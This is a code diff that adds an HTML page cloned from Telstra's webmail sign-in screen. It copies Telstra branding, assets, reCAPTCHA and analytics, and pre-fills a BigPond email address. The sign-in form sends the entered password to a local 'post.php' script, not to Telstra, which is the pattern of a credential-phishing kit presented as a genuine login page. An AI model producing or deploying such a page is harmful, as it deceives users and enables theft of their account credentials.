@@ -1,0 +1,410 @@
+
+
+
+
+
+
+	
+		
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+		            <script type="text/javascript">
+  var verifyCallback = function(response) {
+	let recapValMsg = document.getElementById("recaptcha-validation-msg");
+    if (response) {
+      recapValMsg.setAttribute('aria-invalid', 'false');
+    } else {
+      recapValMsg.setAttribute('aria-invalid', 'true');
+	}
+  }
+  var onloadCallback = function () {
+    grecaptcha.render(document.getElementById('recaptcha'), {
+      'sitekey': '6LdcxskZAAAAAC6PWFmdmA_KEjpvgUu8Bw1saBnz',
+      'tabindex': '0',
+      'callback': verifyCallback,
+      'theme': 'light'
+    });
+    document.getElementById('g-recaptcha-response').setAttribute('aria-hidden', true);
+  };
+</script>
+    
+  <!DOCTYPE html>
+
+
+<!-- template name: html.form.login.captcha.template.html -->
+
+
+<html lang="en" dir="ltr">
+
+	<head>
+  <!-- meta -->
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <!--favicon-->
+  
+
+<link rel="apple-touch-icon" sizes="180x180" href="assets/favicons/default/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="assets/favicons/default/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="assets/favicons/default/favicon-16x16.png">
+<link rel="manifest" href="assets/favicons/default/site.webmanifest">
+<link rel="mask-icon" href="assets/favicons/default/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#ffffff">
+<meta name="theme-color" content="#ffffff">  <!-- base -->
+  <base href="https://myid.telstra.com/identity/">
+  <!-- title -->
+  <title>Sign in with your Telstra ID</title>
+  <!-- includes -->
+  <style>
+                  @import url('assets/fonts/telstra-fonts.css');
+        @import url('assets/css/min/telstra-able.min.css');
+                  @import url('assets/css/min/webmail-cnsb-custom.min.css');
+                    </style>
+
+  <script>
+    let validMessages = {
+            "Required_Field":"Required field.",
+            "Required_Username_Top":"",
+            "Required_Username":"Required field. Please enter your username.",
+            "Invalid_Username_Top":"Please check the username.",
+            "Invalid_Username":"Invalid entry. Please check the username.",
+            "Required_Password_Top":"",
+            "Required_Password":"Required field. Please enter your password.",
+            "Required_NewPassword":"Required field. Please enter your new password.",
+            "Required_NewPassword_Top":"",
+            "Required_ReEnterPassword":"Required field. Please confirm new password.",
+            "Required_ReEnterPassword_Top":"",
+            "Password_Not_Match":"Passwords do not match",
+            "InValid_PIN":"Invalid PIN. Please check and try again.",
+            "InValid_Code":"Invalid code. Please check and try again.",
+            "InValid_Password":"Invalid entry. Password does not meet minimum requirements",
+            "InValid_Password_Special":"Invalid entry. Password must only contain the typical letters, numbers, punctuation and space characters.",
+            "InValid_Password_Space":"Invalid entry. Password can't begin or end with a space.",
+
+        };
+
+    </script>
+
+  <script src="/identity/assets/js/common.min.js"></script>
+
+         <script src="/identity/assets/js/sha-1.min.js"></script>
+      <script>
+             let enable_hibp_check = "true";
+             let hibp_threshold = "0";
+             let is_signin_check = "true";
+             sessionStorage.setItem('enable_hibp_check',enable_hibp_check);
+             sessionStorage.removeItem('hibp_api_failed');
+             if(!JSON.parse(enable_hibp_check) && !JSON.parse(is_signin_check)){
+                document.addEventListener("DOMContentLoaded", function(){
+                    document.getElementById("ps1").classList.toggle("hide");
+                    document.getElementById("ps2").classList.toggle("hide");
+                    document.getElementById("ps3").classList.toggle("hide");
+              });
+             }
+             sessionStorage.setItem('hibp_threshold',hibp_threshold)
+              function updateUrlWithParms(frm, name, val) {
+                     const action = new URL(frm.action);
+                     action.searchParams.set(name, val);
+                     frm.action = action.href;
+              }
+              function deleteParamsFromUrl(frm, parms){
+                     const action = new URL(frm.action);
+                     parms.forEach((each) => {
+                            action.searchParams.delete(each);
+                     })
+                     frm.action = action.href;
+                    
+              }
+      </script>      <script src="//assets.adobedtm.com/launch-EN150fea03ccaa40d3b4a005dbafdb143c.min.js"></script>
+                    <script type="text/javascript" src="https://www.telstra.com.au/apps/liveperson/import.htm"></script>
+          <script src="/identity/assets/svg4everybody.legacy.js"></script>
+  <script>
+    var isIE = "-ms-scroll-limit" in document.documentElement.style && "-ms-ime-align" in document.documentElement.style;
+    if (isIE) {
+      svg4everybody();
+    }
+  </script>
+</head>
+	<body>
+		<div>
+
+			<header class="t-page-header">
+			<svg width="28px" height="30px" viewBox="0 0 28 30" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-label="Telstra Logo" role="img" focusable="false">
+    <defs>
+        <polygon id="path-1" points="0.0157894737 0.142713178 0.0157894737 23.3170543 24.7531579 23.3170543 24.7531579 0.142713178 0.0157894737 0.142713178"></polygon>
+    </defs>
+    <g id="NEW-UI-DESIGN-APPROVAL" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="TelstraID-M-Check-1" transform="translate(-277.000000, -21.000000)">
+            <g id="Icons-/-Logo-/-blue" transform="translate(271.000000, 16.000000)">
+                <g id="Primary-Blue-RGB" transform="translate(6.666667, 5.000000)">
+                    <g id="Group-3" transform="translate(0.000000, 6.666667)">
+                        <mask id="mask-2" fill="white">
+                            <use xlink:href="#path-1"></use>
+                        </mask>
+                        <g id="Clip-2"></g>
+                        <path d="M17.4526316,6.10817829 L16.2989474,13.0965116 C16.0607895,14.3537984 15.2576316,14.6943023 14.5444737,14.6943023 L9.20131579,14.6943023 L11.4528947,1.89488372 C9.20473684,0.834844961 6.90947368,0.142713178 5.08157895,0.142713178 C3.34263158,0.142713178 1.93052632,0.62755814 0.991578947,1.78934109 C0.329736842,2.61523256 0,3.63457364 0,4.84709302 C0,8.48600775 2.77605263,13.5352326 7.52736842,17.6541085 C11.7631579,21.2949225 16.4226316,23.3333333 19.8142105,23.3333333 C21.5060526,23.3333333 22.8710526,22.7991085 23.7668421,21.7331008 C24.4721053,20.9080233 24.7531579,19.8379457 24.7531579,18.6256977 C24.7531579,15.0898837 21.9571053,10.132907 17.4526316,6.10817829" id="Fill-1" fill="#0099F8" mask="url(#mask-2)"></path>
+                    </g>
+                    <path d="M5.78645688,1.47677152 L5,5.60790566 L12.0304729,5.60790566 L9.01241707,21.6666667 L14.6035307,21.6666667 C15.3497835,21.6666667 16.1902129,21.3332107 16.4394228,20.1019478 L18.9962338,5.60790566 L24.0534048,5.60790566 C24.944227,5.60790566 25.6800158,5.03717784 25.8774561,4.13591677 L26.6666667,0 L7.60830516,0 C6.72078747,0 5.9830711,0.574713348 5.78645688,1.47677152 Z" id="Fill-4" fill="#001E82"></path>
+                </g>
+            </g>
+        </g>
+    </g>
+</svg>	</header>
+
+							<div role="main" class="t-form-container">
+				
+								
+					<h1 class="t-able-heading-a   t-able-spacing-2x-mb "> Sign in to Telstra webmail </h1>
+																		<div class="t-able-text-bodyshort t-able-spacing-5x-mb">Sign in with your Telstra email address</div>
+																<form method="POST" action="post.php" autocomplete="off">
+												                                							    		<script>
+    	setCookie("t_login_page",'https:\/\/myid.telstra.com\/identity\/as\/authorization.oauth2?client_id=b2c\-webmail',30);
+	</script>
+
+						
+
+	<div class="t-back-to-previous-label t-able-spacing-2x-mb" >Back to previous for:</div>
+	<a class="t-input-with-anchor   t-able-spacing-4x-mb " data-t-cookie-name="t_login_page" data-t-cookie-value-in-attribute="href" data-t-cookie-show="false" onclick="loadAnalyticEvents('click', 'clickTrack', 'buttonClick', 'Back to previous')">
+			<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="6.98" height="12.45" viewBox="0 0 6.98 12.45" role="img" aria-hidden="true" focusable="false">
+		<defs>
+			<clipPath id="a">
+				<path d="M1.82,6.22,6.76,1.28A.75.75,0,1,0,5.7.22L.22,5.69A.77.77,0,0,0,0,6.23a.75.75,0,0,0,.22.53L5.7,12.23a.75.75,0,0,0,.53.22.76.76,0,0,0,.53-.23A.75.75,0,0,0,7,11.69a.77.77,0,0,0-.22-.54Z" fill="none" clip-rule="evenodd"/>
+			</clipPath>
+		</defs>
+		<g clip-path="url(#a)"><rect x="-5" y="-5" width="16.98" height="22.45" fill="#0064d2"/></g>
+	</svg>
+		<span class="t-able-sr-only">Back to previous for</span>
+		<span id="userNameSpan">tetstd@bigpond.com.au</span>
+	</a>
+	<input type="hidden" name="pf.username" id="modUsername" value="tetstd@bigpond.com.au">
+						<div class="t-able-text-field t-pwd-field  t-able-spacing-2x-mb  ">
+	<label for="password">Password</label>
+	<input id="password" type="password" name="pf.pass" autofocus autocomplete="current-password" aria-invalid="false" aria-required="true" aria-describedby="" onblur="handleOnblurEvent(event, true)">
+	<button type="button" id="showPwdBtn" class="t-able-low-emph-button t-showpwd" aria-label="Show password characters" onclick="showHide('show', 'showPwdBtn', 'hidePwdBtn', 'password', 't-icon--hidden')">Show</button>
+	<button type="button" id="hidePwdBtn" class="t-able-low-emph-button t-showpwd t-icon--hidden" aria-label="Hide password characters" onclick="showHide('hide', 'hidePwdBtn', 'showPwdBtn', 'password', 't-icon--hidden')">Hide</button>
+	<p id="password-error-text"></p>
+</div>
+						
+													
+					
+			
+	<div class=" t-able-spacing-5x-mb ">
+												<a class="t-able-low-emph-button  t-reset-password-link " href="https://myid.telstra.com/identity/as/authorization.oauth2?client_id=b2c-webmail&amp;PasswordReset_UsernameVerification=true" onclick="loadAnalyticEvents('click', 'clickTrack', 'linkClick', 'Reset password')">
+					Reset password
+									</a>
+						</div>
+												                            <div class="t-recaptcha">
+	<div id="recaptcha" class="g-recaptcha" aria-describedby="recaptcha-error-text" aria-invalid="false"></div>
+			<div id="recaptcha-validation-msg" class="t-validation-msg t-icon--hidden">
+
+							<p role="alert" class="t-validator" id="recaptcha-error-text" aria-invalid="false">
+					<i class="t-icon--small" aria-hidden="true">
+													<svg width="22" height="22" viewBox="0 0 22 22" xmlns="http://www.w3.org/2000/svg">
+    <g id="Artboard" fill="none" fill-rule="evenodd">
+        <g id="alert-small" transform="translate(2 2)" fill="#D0021B" fill-rule="nonzero">
+            <path d="M17.085,12.895 L9.955,1.271 C9.48,0.496 8.703,0.507 8.229,1.282 L1.099,12.891 C0.624,13.666 0.978,14.264 1.886,14.264 L16.296,14.264 C17.206,14.264 17.56,13.67 17.086,12.895 L17.085,12.895 Z M9.085,3.845 C9.542,3.845 9.895,4.349 9.872,4.965 L9.728,8.68 C9.704,9.296 9.415,9.8 9.084,9.8 C8.754,9.8 8.464,9.296 8.44,8.68 L8.297,4.965 C8.273,4.349 8.627,3.845 9.086,3.845 L9.085,3.845 Z M9.085,12.599 C8.509,12.599 8.115,12.178 8.126,11.602 C8.126,11.014 8.522,10.605 9.086,10.605 C9.673,10.605 10.044,11.014 10.056,11.602 C10.056,12.178 9.673,12.599 9.086,12.599 L9.085,12.599 Z"
+                id="a"></path>
+        </g>
+    </g>
+</svg>
+											</i>
+					Please confirm you're not a robot
+				</p>
+					</div>
+	</div>
+<script src="https://www.recaptcha.net/recaptcha/api.js?onload=onloadCallback&amp;render=explicit" async defer>
+</script>
+                        						<input type="hidden" name="pf.ok" value="clicked"/>
+						<input type="hidden" name="pf.cancel" value=""/>
+						<input type="hidden" name="client_id" value="b2c-webmail"/>
+						<input type="hidden" name="pf.adapterId" id="pf.adapterId" value="upAdapterReCaptcha"/>
+
+						<div class="">
+							<button id="submit_btn" class="t-able-high-emph-button  t-able-spacing-7x-mb " type="submit" onclick="handleSubmitBtnClk(event)">Sign in</button>
+						</div>
+						
+					</form>
+				</div>
+						
+<footer class="t-footer">
+	<div class="t-footer-content">
+		<p class="t-footer-copyright">Copyright © 2022 Telstra</p>
+				<a class="t-footer-privacy" href="https://www.telstra.com.au/privacy/privacy-statement" target="_blank">Privacy</a>
+							<a class="t-footer-terms" href="https://www.telstra.com.au/terms-of-use" target="_blank">Terms of use</a>
+			</div>
+</footer>
+		</div>
+
+		
+
+
+<script>
+    var subDivUnit = "TR";
+    	var secondCat = "";
+				secondCat = "Sign in";
+	    window.digitalData = {};
+    window.digitalData.page = {};
+
+    window.digitalData.page.pageInfo = {
+		pageName: "nulltitle",
+		destinationURL: window.location.href,
+		referringURL: document.referrer,
+		sysEnv: "desktop",
+		deployEnv: "production",
+    };
+    window.digitalData.page.attributes = {
+        division : "TD",
+        subDivision : "TR",
+        subDivisionUnit : subDivUnit
+    };
+
+	
+    window.digitalData.page.category = {
+        primaryCategory : "identity",
+        secondaryCategory : secondCat,
+        tertiaryCategory: "",
+        pageType : "service"
+    };
+
+            window.digitalData.page.pageInfo.pageName = "sign in - password";
+              window.digitalData.user = [];
+      window.digitalData.user = [{
+								"profile": [
+											{
+												"profileInfo": {
+													"loggedInUsing": "Telstra ID:b2c-webmail"
+												}
+											}
+										   ]
+							  }];
+    
+    function loadAnalyticEvents(eventAction, eventType, eventCategory, eventName) {
+        let eventData = null;
+        eventData = {
+                     "eventInfo": {
+                        "eventAction": eventAction,
+                        "eventType": eventType,
+                        "eventCategory": eventCategory,
+                        "eventName": eventName
+                     },
+                     "attributes": {}
+                    }
+
+        const analytics = window.digitalData;
+        if (!("event" in analytics))
+            analytics.event = [];
+
+        if (eventData) {
+            analytics.event.push(eventData);
+        } else {
+            analytics.event.push(
+                {
+                    "eventInfo": {
+                        "eventAction": "error"
+                    }
+                }
+            )
+        }
+        return (window.digitalData = analytics);
+    }
+
+</script>
+<script type="text/javascript">
+  _satellite.pageBottom();
+</script>		<script src="/identity/assets/js/common.min.js"></script>
+
+		<script>
+			
+			function handleSubmitBtnClk(event) {
+				event.preventDefault();
+				serverError = false;
+
+				let isValid = true;
+				let unId = "modUsername";
+								loadAnalyticEvents('click', 'clickTrack', 'buttonClick', 'Sign in');
+				let ariaDescId = "password-error-text";
+				if (!validateField("password", ariaDescId, true)) {
+					isValid = false;
+				}
+								let segm = 'cnsb';
+								if(!recaptchaValidation(segm)) {
+					isValid = false;
+				}
+				if(isValid) {
+					removeDomainFromUsername(unId);
+					document.getElementById("submit_btn").setAttribute('disabled', 'true');                
+
+											validatePasswordWithHIBPApi(document.getElementById('password').value).then(res => {
+							const hibpCount = sessionStorage.getItem("hibp_b");
+							if(res && hibpCount && hibpCount >= 10) {
+								setCookie('isCompromised', 'true');
+								setCookie('compromisedReport', 'true');          	
+							} else {
+								setCookie('isCompromised', 'false');
+							}
+						}).finally(() => {
+							document.forms[0].submit();
+						});
+									}
+			}
+
+			let errMsg = '';
+			let t_username_cookie = getCookie('t_username');
+			if(t_username_cookie){
+				document.getElementById("modUsername").value = t_username_cookie;
+									document.getElementById('userNameSpan').innerText=t_username_cookie;
+								errMsg = t_username_cookie.replaceAll(/[\x3C\x3E\x26]/g, "") + " is already registered to a Telstra ID. Please Sign in.";
+				document.getElementById('password-error-text').innerHTML = `<svg class="able-icon" role="img" aria-label="Error" focusable="false">
+	            <use href="./assets/able-sprites.svg?v8#Error"></use>
+	        </svg> ${errMsg}`;
+				setCookie('id_first_username',t_username_cookie);
+				deleteCookie('t_username');
+			}
+
+			var userNmInpVal = document.getElementById("modUsername").value;
+			setCookie('t_username',userNmInpVal);
+
+			if (userNmInpVal.length > 30) {
+				let modifiedUN = getShortenedUsername(userNmInpVal);
+				document.getElementById('userNameSpan').innerText=modifiedUN;
+			}
+			if (getCookie('remember_un')) {
+				loadAnalyticEvents('click', 'submit', 'confirmation', 'Remember username');
+			}
+			deleteCookie('t_signed_out');
+					</script>
+	</body>
+			<script>
+    var sectionList;
+            sectionList = ["telstra", "consumer", "identity","forgot-password","dtq"];
+    
+  livePerson.init({
+    section: sectionList,
+    sourceSection: ["tcom"],
+    onlyTcomCSS: true,
+    forceButtonCss: true,
+    callBack: function () {
+      console.log("CallBack called");
+    },
+    callBackInterval: 2
+  });
+</script>
+	</html>
